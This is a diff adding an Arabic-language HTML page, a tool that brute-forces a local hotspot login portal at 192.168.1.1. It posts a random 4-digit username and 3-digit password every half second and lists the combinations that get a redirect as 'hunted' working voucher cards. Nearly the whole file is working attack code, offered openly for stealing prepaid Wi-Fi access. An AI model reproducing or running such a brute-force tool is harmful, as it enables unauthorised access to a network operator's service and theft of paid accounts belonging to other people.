@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>قناص تيم نت الاحترافي</title>
+    <style>
+        body { background: #1a1a2e; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
+        .card { border: 2px solid #4d0092; border-radius: 15px; background: #16213e; padding: 20px; max-width: 400px; margin: auto; box-shadow: 0 0 15px #4d0092; }
+        .status-box { background: #000; color: #0f0; height: 120px; overflow-y: auto; margin: 15px 0; padding: 10px; font-size: 12px; text-align: left; border-radius: 5px; }
+        button { background: #4d0092; color: #fff; border: none; padding: 10px 25px; border-radius: 5px; font-size: 18px; cursor: pointer; width: 100%; }
+        table { width: 100%; margin-top: 15px; border-collapse: collapse; }
+        th, td { border: 1px solid #4d0092; padding: 8px; font-size: 14px; }
+        th { background: #0f3460; }
+        .hit { color: #ffff00; font-weight: bold; background: #1b4332; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2 style="color: #4d0092;">📶 قناص شبكة تيم نت</h2>
+    <div style="font-size: 14px; margin-bottom: 10px;">المحاولات: <span id="tries">0</span> | الصيد: <span id="hits">0</span></div>
+    
+    <button id="btn" onclick="toggle()">ابدأ الصيد</button>
+
+    <div id="status" class="status-box">بانتظار البدء...</div>
+
+    <h4>📋 الكروت المصطادة:</h4>
+    <table>
+        <thead>
+            <tr>
+                <th>المستخدم</th>
+                <th>كلمة السر</th>
+                <th>الحالة</th>
+            </tr>
+        </thead>
+        <tbody id="list"></tbody>
+    </table>
+</div>
+
+<script>
+    let active = false, attempts = 0, hits = 0, timer;
+    const TARGET = "http://192.168.1.1/login";
+
+    function toggle() {
+        active = !active;
+        document.getElementById('btn').innerText = active ? "إيقاف" : "ابدأ الصيد";
+        document.getElementById('btn').style.background = active ? "#920000" : "#4d0092";
+        if(active) hunt(); else clearTimeout(timer);
+    }
+
+    async function hunt() {
+        if(!active) return;
+        
+        // توليد الأرقام حسب الصورة (يوزر 4 وباسورد 3)
+        let u = Math.floor(1000 + Math.random() * 9000).toString();
+        let p = Math.floor(100 + Math.random() * 900).toString();
+        
+        attempts++;
+        document.getElementById('tries').innerText = attempts;
+        const st = document.getElementById('status');
+        st.innerHTML += `[*] فحص: ${u} | ${p}<br>`;
+        st.scrollTop = st.scrollHeight;
+
+        try {
+            // محاولة إرسال البيانات بأسماء الحقول الأكثر شيوعاً في تيم نت
+            let res = await fetch(TARGET, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `username=${u}&password=${p}&user=${u}&pass=${p}&dst=&popup=true`,
+                redirect: 'manual'
+            });
+
+            if (res.status === 302 || res.status === 0 || res.type === 'opaqueredirect') {
+                hits++;
+                document.getElementById('hits').innerText = hits;
+                document.getElementById('list').innerHTML = `<tr class="hit"><td>${u}</td><td>${p}</td><td>شغال ✅</td></tr>` + document.getElementById('list').innerHTML;
+                alert(`🔥 صيد جديد!\nيوزر: ${u}\nباسورد: ${p}`);
+            }
+        } catch (e) {}
+
+        timer = setTimeout(hunt, 500); // سرعة نصف ثانية
+    }
+</script>
+
+</body>
+</html>
